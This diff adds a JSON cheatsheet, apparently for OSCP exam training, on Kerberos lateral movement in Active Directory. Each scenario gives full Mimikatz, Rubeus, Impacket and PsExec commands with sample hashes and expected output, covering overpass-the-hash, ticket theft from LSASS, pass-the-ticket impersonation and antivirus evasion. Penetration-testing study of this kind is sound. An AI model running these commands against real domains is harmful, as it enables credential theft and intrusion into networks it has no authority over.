@@ -1,0 +1,169 @@
+{
+  "cheatsheets": [
+    {
+      "id": "ad-kerberos-lateral-movement",
+      "name": "Kerberos Lateral Movement - Overpass-the-Hash and Pass-the-Ticket Attacks",
+      "description": "Complete guide to Kerberos-based lateral movement: TGT/TGS ticket mechanics, overpass-the-hash (NTLM-to-Kerberos conversion), pass-the-ticket, ticket manipulation with Mimikatz/Rubeus",
+      "educational_header": {
+        "how_to_recognize": [
+          "You have NTLM hash but target tool requires Kerberos authentication (Microsoft PsExec.exe, certain COM objects)",
+          "Need to use Kerberos ticket for lateral movement instead of NTLM pass-the-hash",
+          "Mimikatz output shows 'kerberos::ptt' or Rubeus shows 'asktgt' commands with .kirbi files",
+          "Tool fails with 'Kerberos authentication required' but you only have NTLM hash",
+          "Want to understand difference between pass-the-hash (NTLM) vs. overpass-the-hash (Kerberos) vs. pass-the-ticket"
+        ],
+        "when_to_look_for": [
+          "After dumping NTLM hashes when Impacket tools (psexec, wmiexec) fail but you have access to compromised Windows machine",
+          "When you need to use official Microsoft tools (PsExec64.exe from SysInternals) that only support Kerberos",
+          "After obtaining Kerberos .kirbi ticket files from mimikatz/Rubeus dumps",
+          "When time synchronization issues prevent direct Kerberos attacks (Golden/Silver tickets)",
+          "OSCP exam: Kerberos lateral movement less common than NTLM but critical when NTLM path blocked - understand ticket lifecycle and klist verification"
+        ]
+      },
+      "scenarios": [
+        {
+          "title": "Scenario 1: Understanding Kerberos vs. NTLM Authentication (Why Upgrade Hash to Ticket?)",
+          "context": "You have NTLM hash '8846f7eaee8fb117ad06bdd830b7586c' for corp\\admin and successfully used it with Impacket psexec for lateral movement. Now you want to use Microsoft PsExec64.exe (official SysInternals version) but it fails with error: 'Access is denied'. Why does Microsoft tool fail when Impacket succeeds with same hash? This is authentication protocol difference: Kerberos vs. NTLM.",
+          "approach": "NTLM (Impacket): Challenge-response using hash directly. Works with Impacket tools (psexec, wmiexec, smbexec) because they implement NTLM natively. KERBEROS (Microsoft tools): Ticket-based authentication using TGT (Ticket Granting Ticket) and TGS (Service Ticket). Microsoft PsExec64.exe REQUIRES Kerberos - it won't accept NTLM. SOLUTION: Overpass-the-Hash = convert NTLM hash to Kerberos TGT. Technique: (1) Use Mimikatz to inject hash into LSASS, (2) Request TGT from domain controller using hash, (3) Use TGT to request service tickets, (4) Microsoft tools now work because they see valid Kerberos tickets in cache.",
+          "commands": [
+            "overpass-mimikatz-pth",
+            "kerberos-klist-verify"
+          ],
+          "expected_outcome": "NTLM path (works with Impacket): 'impacket-psexec -hashes :8846f7... corp/admin@target' → Authentication uses NTLM challenge-response, no tickets needed, server validates hash against SAM/NTDS. KERBEROS path (required for Microsoft PsExec): Step 1 - Overpass-the-hash with Mimikatz: 'sekurlsa::pth /user:admin /domain:corp.com /ntlm:8846f7... /run:powershell' → New PowerShell spawns with injected credentials. Step 2 - Trigger Kerberos: 'net use \\\\DC01.corp.com' → Forces Kerberos pre-authentication, generates TGT. Step 3 - Verify tickets: 'klist' → Shows 'krbtgt/CORP.COM' (TGT) and 'cifs/DC01.corp.com' (TGS). Step 4 - Use Microsoft PsExec: 'PsExec64.exe \\\\TARGET cmd' → Works! Uses cached Kerberos tickets for authentication. INSIGHT: Same hash, different protocols. Impacket = NTLM-capable, Microsoft tools = Kerberos-only.",
+          "why_this_works": "Active Directory supports two authentication protocols: (1) NTLM - Legacy, challenge-response, hash-based. (2) Kerberos - Modern, ticket-based, time-sensitive. NTLM authentication: Client proves password knowledge by encrypting challenge with hash. Pass-the-hash works because you have the hash. KERBEROS authentication: Client requests TGT from KDC (Key Distribution Center = DC), uses TGT to request service tickets (TGS), presents TGS to target service. Overpass-the-Hash bridges these: Uses NTLM hash for Kerberos pre-authentication (requesting TGT), resulting TGT is legitimate Kerberos ticket, can be used for any Kerberos authentication. WHY NEEDED: Some Windows features ONLY support Kerberos (delegation, certain COM objects, Microsoft PsExec). Impacket tools support NTLM but Microsoft tools don't. Overpass-the-hash enables Kerberos-only tools with just hash - no password cracking needed."
+        },
+        {
+          "title": "Scenario 2: Overpass-the-Hash with Mimikatz (NTLM to TGT Conversion)",
+          "context": "You're on compromised Windows workstation (CORP\\helpdesk session) with Mimikatz uploaded. You have NTLM hash for CORP\\Administrator (31d6cfe0d16ae931b73c59d7e0c089c0) obtained from SAM dump. You need to use Microsoft PsExec64.exe to move laterally to file server, but PsExec requires Kerberos. You must convert hash to Kerberos TGT.",
+          "approach": "Step 1 - Launch Mimikatz as Administrator: 'mimikatz.exe', 'privilege::debug' (must return 'Privilege 20 OK'). Step 2 - Inject hash and spawn new process: 'sekurlsa::pth /user:Administrator /domain:CORP /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:powershell.exe'. This spawns NEW PowerShell window with injected credentials in memory. Step 3 - From new PowerShell window, trigger Kerberos: 'net use \\\\DC01.CORP.COM' (MUST use hostname, not IP - Kerberos requires SPN). Step 4 - Verify tickets created: 'klist' (should show TGT and TGS). Step 5 - Use Microsoft PsExec: 'PsExec64.exe \\\\FILESERVER cmd'. Authentication uses cached tickets.",
+          "commands": [
+            "overpass-mimikatz-pth",
+            "overpass-net-use-trigger",
+            "kerberos-klist-verify",
+            "psexec-sysinternals-interactive"
+          ],
+          "expected_outcome": "Mimikatz 'privilege::debug' output: 'Privilege '20' OK'. Mimikatz 'sekurlsa::pth' output: 'user : Administrator, domain : CORP, program : powershell.exe, NTLM : 31d6cfe0d16ae931b73c59d7e0c089c0, | PID 4532 | TID 2108'. NEW PowerShell window appears (PID 4532). From new PowerShell: 'net use \\\\DC01.CORP.COM' → 'The command completed successfully'. 'klist' output: 'Cached Tickets: (2) #0> Client: Administrator @ CORP.COM, Server: krbtgt/CORP.COM @ CORP.COM [TGT], #1> Client: Administrator @ CORP.COM, Server: cifs/DC01.CORP.COM @ CORP.COM [TGS]'. TGT and TGS present! 'PsExec64.exe \\\\FILESERVER cmd' → Interactive cmd.exe on FILESERVER. Overpass-the-hash succeeded - converted hash to usable Kerberos tickets.",
+          "why_this_works": "Mimikatz 'sekurlsa::pth' performs pass-the-hash by: (1) Spawning new process (powershell.exe), (2) Injecting NTLM hash into new process's LSASS memory space, (3) Process now has credentials cached (as if user logged in with password). When you run 'net use \\\\DC01' from this process, Windows: (1) Detects Kerberos SPN (cifs/DC01), (2) Initiates Kerberos pre-authentication, (3) Uses injected NTLM hash to compute pre-auth data, (4) Sends AS-REQ (Authentication Service Request) to KDC (DC), (5) KDC validates pre-auth and issues TGT, (6) Client requests TGS for cifs/DC01 service, (7) TGT and TGS cached in memory. KEY: Kerberos pre-authentication uses NTLM hash (encrypted timestamp) - same hash used in pass-the-hash. Once TGT obtained, it's legitimate Kerberos ticket valid for all Kerberos operations. Microsoft PsExec sees cached tickets via klist and uses them automatically."
+        },
+        {
+          "title": "Scenario 3: Rubeus Alternative to Mimikatz (AV Evasion)",
+          "context": "Mimikatz is heavily signatured by antivirus. You have NTLM hash and need Kerberos TGT but Mimikatz gets deleted by Windows Defender immediately upon upload. Rubeus is C# Kerberos toolkit less detected than Mimikatz - it can request TGTs using NTLM hash via asktgt command.",
+          "approach": "Rubeus 'asktgt' command requests TGT directly from KDC using NTLM hash. Syntax: 'Rubeus.exe asktgt /user:Administrator /domain:corp.com /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /ptt'. The '/ptt' flag (pass-the-ticket) automatically imports ticket into current logon session. Alternative: Save ticket to file: 'Rubeus.exe asktgt /user:Administrator /domain:corp.com /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /outfile:admin.kirbi', then import: 'Rubeus.exe ptt /ticket:admin.kirbi'. Rubeus operates at higher level than Mimikatz (doesn't need SeDebugPrivilege, doesn't touch LSASS directly).",
+          "commands": [
+            "kerberos-rubeus-asktgt",
+            "kerberos-rubeus-ptt",
+            "kerberos-klist-verify"
+          ],
+          "expected_outcome": "Rubeus asktgt output: '[*] Action: Ask TGT, [*] Using NTLM hash for user Administrator, [*] Building AS-REQ for: corp.com\\Administrator, [+] TGT request successful!, [*] base64(ticket.kirbi): doIFuj... [long base64 blob], [+] Ticket successfully imported!'. 'klist' verification: 'Cached Tickets: (1) #0> Client: Administrator @ CORP.COM, Server: krbtgt/CORP.COM @ CORP.COM, KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96, Ticket Flags: 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize'. TGT is now cached. Use Microsoft PsExec or any Kerberos tool: 'PsExec64.exe \\\\TARGET cmd' → Works! Rubeus bypasses AV better than Mimikatz because: (1) C# compiled on-demand (no static signature), (2) Doesn't access LSASS (no LSASS protection trigger), (3) Uses legitimate Kerberos APIs.",
+          "why_this_works": "Rubeus 'asktgt' sends AS-REQ (Authentication Service Request) directly to KDC using Windows Kerberos APIs. Process: (1) Builds AS-REQ with encrypted timestamp (uses NTLM hash for encryption), (2) Sends to KDC (DC) port 88 (Kerberos), (3) KDC validates encrypted timestamp (proves hash knowledge), (4) KDC issues AS-REP (Authentication Service Response) containing TGT, (5) Rubeus extracts TGT from AS-REP, (6) Imports TGT into Windows credential cache (same cache used by klist). This is IDENTICAL to legitimate Kerberos login - no exploitation, just using hash for pre-auth. Advantages over Mimikatz: (1) No LSASS interaction (no privilege::debug needed), (2) Operates in user-mode (no kernel/driver interaction), (3) Easier to obfuscate (C# can be compiled in memory, Invoke-Rubeus). Disadvantages: (1) Requires .NET Framework (usually present), (2) Less feature-complete than Mimikatz for other attacks."
+        },
+        {
+          "title": "Scenario 4: Pass-the-Ticket (Using Existing Tickets)",
+          "context": "You have SYSTEM shell on WORKSTATION01 and dumped Kerberos tickets from memory using Mimikatz ('sekurlsa::tickets /export'). This created .kirbi files on disk (0-40a10000-admin@krbtgt-CORP.COM.kirbi). You want to import these tickets on different machine or different user session to impersonate the ticket owner. This is Pass-the-Ticket attack.",
+          "approach": "Pass-the-Ticket = injecting existing Kerberos ticket into your session. Step 1 - Export tickets from compromised machine: Mimikatz 'sekurlsa::tickets /export' (requires SYSTEM/admin) OR Rubeus 'dump /luid:0x3e7 /nowrap' (less invasive). Step 2 - Transfer .kirbi file to attacker machine or new session. Step 3 - Import ticket: Mimikatz 'kerberos::ptt 0-40a10000-admin@krbtgt-CORP.COM.kirbi' OR Rubeus 'ptt /ticket:admin.kirbi'. Step 4 - Verify: 'klist' shows imported ticket. Step 5 - Use ticket: Access resources as ticket owner (net use, PsExec, etc.).",
+          "commands": [
+            "mimikatz-export-tickets",
+            "kerberos-rubeus-ptt",
+            "kerberos-klist-verify"
+          ],
+          "expected_outcome": "Mimikatz export output: '[00000000] Primary * NTLM, Administrator, krbtgt/CORP.COM, 0x40a10000, * Saved to file: 0-40a10000-Administrator@krbtgt-CORP.COM.kirbi'. Ticket file created on disk. Import on attacker workstation: Mimikatz 'kerberos::ptt 0-40a10000-Administrator@krbtgt-CORP.COM.kirbi' → '* File: 0-40a10000-Administrator@krbtgt-CORP.COM.kirbi: OK'. 'klist' verification: 'Cached Tickets: (1) #0> Client: Administrator @ CORP.COM, Server: krbtgt/CORP.COM @ CORP.COM [TGT]'. Test access: 'net use \\\\DC01.CORP.COM\\c$' → 'The command completed successfully'. You're now authenticated as Administrator using stolen ticket. No password or hash needed - ticket is sufficient.",
+          "why_this_works": "Kerberos tickets are portable credentials stored in LSASS memory. When you authenticate with Kerberos, TGT and TGS tickets are cached in memory for reuse (avoids re-authenticating for each request). Mimikatz 'sekurlsa::tickets /export' extracts these tickets from LSASS and saves to .kirbi files (Kerberos ticket format). The ticket contains: (1) Client name (Administrator), (2) Service name (krbtgt for TGT, service name for TGS), (3) Session key (encrypted with service's key), (4) Ticket expiration time (default 10 hours for TGT), (5) Flags (forwardable, renewable, etc.). When you import ticket with 'kerberos::ptt', it's injected into YOUR session's credential cache. Windows doesn't validate WHERE ticket came from - it trusts tickets in cache. When you access resources, Windows presents cached ticket, service validates ticket (encrypted with service's secret key), access granted. LIMITATION: Tickets expire (TGT = 10 hours, TGS = varies). Stolen ticket stops working after expiration."
+        },
+        {
+          "title": "Scenario 5: Ticket Manipulation Troubleshooting (Time Sync, SPN Issues)",
+          "context": "Your overpass-the-hash or pass-the-ticket attack fails with errors: 'KRB_AP_ERR_SKEW' (time synchronization), 'KDC_ERR_S_PRINCIPAL_UNKNOWN' (SPN not found), 'KRB_AP_ERR_TKT_EXPIRED' (ticket expired). Kerberos is time-sensitive and SPN-dependent - troubleshooting requires understanding these constraints.",
+          "approach": "Time sync error (KRB_AP_ERR_SKEW): Kerberos requires client and server clocks within 5 minutes. Check: 'net time \\\\DC01' (shows DC time), sync: 'net time \\\\DC01 /set /y' (sync to DC). SPN error (KDC_ERR_S_PRINCIPAL_UNKNOWN): You used IP address instead of hostname. Kerberos REQUIRES hostnames for SPN construction. Fix: Use 'net use \\\\DC01.CORP.COM' not 'net use \\\\192.168.50.10'. Ticket expired: Check 'klist' output for EndTime. Re-request TGT if expired. Purge old tickets: 'klist purge', then re-run overpass-the-hash. Also verify domain connectivity - Kerberos needs DNS resolution and port 88 (Kerberos) accessible to DC.",
+          "commands": [
+            "kerberos-time-sync",
+            "kerberos-klist-verify",
+            "kerberos-purge-tickets"
+          ],
+          "expected_outcome": "Time sync check: 'net time \\\\DC01' → 'Current time at \\\\DC01 is 11/8/2025 2:30:45 PM'. Local time: 11/8/2025 8:30:45 AM (6 hour difference). This exceeds 5-minute Kerberos tolerance → KRB_AP_ERR_SKEW. Fix: 'net time \\\\DC01 /set /y' → 'The command completed successfully'. Retry overpass-the-hash → SUCCESS. SPN troubleshooting: 'net use \\\\192.168.50.10' → 'KDC_ERR_S_PRINCIPAL_UNKNOWN'. Kerberos tried SPN 'cifs/192.168.50.10' but KDC only knows 'cifs/DC01.CORP.COM'. Fix: 'net use \\\\DC01.CORP.COM' → Success. Ticket expiration: 'klist' shows 'EndTime: 11/8/2025 12:30:45 PM', current time 1:00 PM → ticket expired. 'klist purge' → 'Target: All existing tickets will be deleted. Continue? (Y/N) Y, Purging all tickets'. Re-run Rubeus asktgt → fresh TGT obtained.",
+          "why_this_works": "Kerberos security depends on time synchronization and SPN validation. TIME: Tickets contain timestamps to prevent replay attacks. If client clock is skewed >5 minutes from KDC, KDC rejects pre-auth (assumes replayed old request). This is SECURITY FEATURE but breaks attacks if attacker workstation clock differs from domain. Solution: Sync to DC time before Kerberos operations. SPN (Service Principal Name): Kerberos uses SPNs to identify services (format: service/hostname). When you access 'net use \\\\DC01', Windows constructs SPN 'cifs/DC01.CORP.COM' and requests TGS for that SPN. IP addresses don't have SPNs registered in AD → KDC can't issue ticket. Solution: Always use FQDN or NetBIOS name (not IP) for Kerberos operations. EXPIRATION: TGT default lifetime = 10 hours (configurable via GPO). After expiration, ticket is invalid. Client must re-authenticate to obtain new TGT. Stolen tickets stop working after expiration - this limits pass-the-ticket window."
+        },
+        {
+          "title": "Scenario 6: When to Use Kerberos vs. NTLM Lateral Movement",
+          "context": "You have NTLM hash and multiple lateral movement options: (1) Impacket pass-the-hash (NTLM), (2) Overpass-the-hash + Microsoft PsExec (Kerberos), (3) Pass-the-ticket with exported TGT. Which technique should you use? Decision depends on: tools available, target requirements, stealth considerations, time constraints.",
+          "approach": "Decision tree: FROM KALI → Use Impacket pass-the-hash (easiest, NTLM-based, no Windows machine needed). Tools: psexec, wmiexec, smbexec, Evil-WinRM. FROM COMPROMISED WINDOWS MACHINE → Overpass-the-hash if you need Microsoft tools (PsExec64.exe, COM objects requiring Kerberos). FROM DOMAIN CONTROLLER OR HIGH-PRIVILEGE MACHINE → Export tickets with Mimikatz, pass-the-ticket for impersonation. STEALTH CONSIDERATIONS: NTLM pass-the-hash = more common, easier to detect (hash never changes). Kerberos pass-the-ticket = stealthier (tickets expire, limited time window). OSCP EXAM: Prioritize Impacket (NTLM) for speed. Use Kerberos only when NTLM fails or exam specifically requires Microsoft tools.",
+          "commands": [
+            "pth-impacket-psexec",
+            "overpass-mimikatz-pth",
+            "kerberos-rubeus-ptt",
+            "lateral-movement-decision-tree"
+          ],
+          "expected_outcome": "Scenario: You have hash for corp\\admin, you're on Kali, target has port 445 open. FAST PATH: 'impacket-psexec -hashes :fc525c... corp/admin@192.168.50.100' → Instant SYSTEM shell (30 seconds). SLOW PATH: Upload Mimikatz to compromised Windows machine, run overpass-the-hash, spawn PowerShell, trigger Kerberos, verify klist, download Microsoft PsExec64.exe, execute → Same result (10 minutes). OSCP TIME MANAGEMENT: Use Kerberos techniques only when: (1) Impacket blocked by network controls, (2) Target specifically requires Microsoft PsExec (rare in OSCP), (3) You already have TGT exported and want to reuse. Default to NTLM pass-the-hash for exam efficiency - save Kerberos for troubleshooting fallback.",
+          "why_this_works": "NTLM pass-the-hash advantages: (1) Works from Kali (no Windows machine needed), (2) Faster (no ticket request/verification), (3) Simpler (one command vs multi-step process), (4) Well-documented for OSCP. Kerberos advantages: (1) Works with Microsoft tools that don't support NTLM, (2) Tickets are time-limited (stealthier - stolen ticket expires), (3) Delegation support (can forward credentials), (4) Modern AD environments prefer Kerberos over NTLM. WHEN KERBEROS REQUIRED: (1) Microsoft PsExec64.exe (SysInternals version doesn't support NTLM), (2) Certain COM objects (DCOM may require Kerberos depending on configuration), (3) Constrained/unconstrained delegation scenarios. OSCP REALITY: Most exam machines accept NTLM. Kerberos techniques test depth of AD knowledge but aren't usually critical path to flags. Master NTLM first, learn Kerberos for completeness."
+        }
+      ],
+      "sections": [
+        {
+          "title": "Phase 1: Kerberos Fundamentals",
+          "notes": "Kerberos authentication flow: (1) Client requests TGT from KDC (AS-REQ) with encrypted timestamp (uses NTLM hash or password), (2) KDC validates pre-auth and issues TGT (AS-REP), (3) Client requests service ticket TGS (TGS-REQ) using TGT, (4) KDC issues TGS (TGS-REP), (5) Client presents TGS to service, (6) Service validates ticket and grants access. KEY COMPONENTS: TGT = Ticket Granting Ticket (encrypted with krbtgt hash, valid 10 hours), TGS = Service Ticket (encrypted with service's hash, valid for specific service), SPN = Service Principal Name (identifies service, format: service/hostname).",
+          "commands": [
+            "kerberos-klist-verify",
+            "kerberos-time-sync"
+          ]
+        },
+        {
+          "title": "Phase 2: Overpass-the-Hash (NTLM to Kerberos)",
+          "notes": "Convert NTLM hash to Kerberos TGT when target requires Kerberos authentication. METHOD 1 (Mimikatz): sekurlsa::pth injects hash into new process, net use triggers Kerberos pre-auth, TGT cached in memory. METHOD 2 (Rubeus): asktgt requests TGT directly from KDC using hash, ptt imports ticket. REQUIREMENTS: (1) Compromised Windows machine with admin access (Mimikatz) or user access (Rubeus), (2) NTLM hash for target account, (3) Network access to DC port 88 (Kerberos), (4) Time sync within 5 minutes of DC. USE CASES: Microsoft PsExec, Kerberos-only COM objects, delegation scenarios.",
+          "commands": [
+            "overpass-mimikatz-pth",
+            "kerberos-rubeus-asktgt",
+            "overpass-net-use-trigger",
+            "kerberos-klist-verify"
+          ]
+        },
+        {
+          "title": "Phase 3: Pass-the-Ticket (Credential Theft)",
+          "notes": "Export Kerberos tickets from compromised machine, import into attacker session for impersonation. EXPORT: Mimikatz sekurlsa::tickets /export (requires SYSTEM), Rubeus dump (less invasive). IMPORT: Mimikatz kerberos::ptt, Rubeus ptt /ticket. VERIFY: klist shows imported tickets. LIMITATIONS: (1) Tickets expire (TGT = 10 hours default), (2) Only work for services ticket was issued for (TGS), (3) TGT can request new TGS but expiration still applies. ADVANTAGES: No password or hash needed, ticket is sufficient credential. DETECTION: Less common than pass-the-hash, blue teams focus on NTLM.",
+          "commands": [
+            "mimikatz-export-tickets",
+            "kerberos-rubeus-ptt",
+            "kerberos-klist-verify",
+            "kerberos-purge-tickets"
+          ]
+        },
+        {
+          "title": "Phase 4: Kerberos Troubleshooting",
+          "notes": "Common Kerberos errors: KRB_AP_ERR_SKEW = time sync issue (fix: net time /set), KDC_ERR_S_PRINCIPAL_UNKNOWN = SPN not found (use hostname not IP), KRB_AP_ERR_TKT_EXPIRED = ticket expired (request new TGT), KDC_ERR_PREAUTH_FAILED = wrong password/hash, KDC_ERR_C_PRINCIPAL_UNKNOWN = account doesn't exist. DEBUGGING STEPS: (1) Verify time sync with DC, (2) Use hostnames (not IPs) for SPN construction, (3) Check ticket expiration with klist, (4) Verify DNS resolution, (5) Confirm port 88 (Kerberos) accessible to DC, (6) Purge old tickets and retry.",
+          "commands": [
+            "kerberos-time-sync",
+            "kerberos-klist-verify",
+            "kerberos-purge-tickets"
+          ]
+        },
+        {
+          "title": "Phase 5: Technique Selection (NTLM vs Kerberos)",
+          "notes": "NTLM pass-the-hash (default): Use from Kali with Impacket (psexec, wmiexec, smbexec, Evil-WinRM). Faster, simpler, well-documented for OSCP. Overpass-the-hash (when NTLM blocked): Use from compromised Windows machine when target requires Kerberos (Microsoft PsExec, COM objects). Slower, multi-step, requires Windows machine. Pass-the-ticket (opportunistic): Use when you've already dumped tickets from high-value target. Limited time window (ticket expiration). OSCP PRIORITY: Master NTLM first (80% of exam lateral movement), understand Kerberos for completeness and troubleshooting (20%).",
+          "commands": [
+            "pth-impacket-psexec",
+            "overpass-mimikatz-pth",
+            "kerberos-rubeus-asktgt",
+            "lateral-movement-decision-tree"
+          ]
+        },
+        {
+          "title": "Phase 6: Post-Exploitation with Kerberos",
+          "notes": "After successful Kerberos lateral movement: (1) Dump additional tickets - Mimikatz sekurlsa::tickets /export (steal other users' tickets from LSASS), (2) Request service tickets - Use TGT to request TGS for services (cifs, http, mssql), (3) Enumerate SPNs - setspn -T domain -Q */* (find all registered SPNs in domain for Kerberoasting), (4) Check delegation - Look for unconstrained/constrained delegation misconfigurations. Kerberos tickets are highly portable - export from one machine, use on another, impersonate users without passwords.",
+          "commands": [
+            "mimikatz-export-tickets",
+            "kerberos-rubeus-ptt",
+            "kerberos-klist-verify"
+          ]
+        }
+      ],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "KERBEROS",
+        "OVERPASS_THE_HASH",
+        "PASS_THE_TICKET",
+        "LATERAL_MOVEMENT",
+        "MIMIKATZ",
+        "RUBEUS",
+        "TGT",
+        "OSCP:MEDIUM"
+      ]
+    }
+  ]
+}
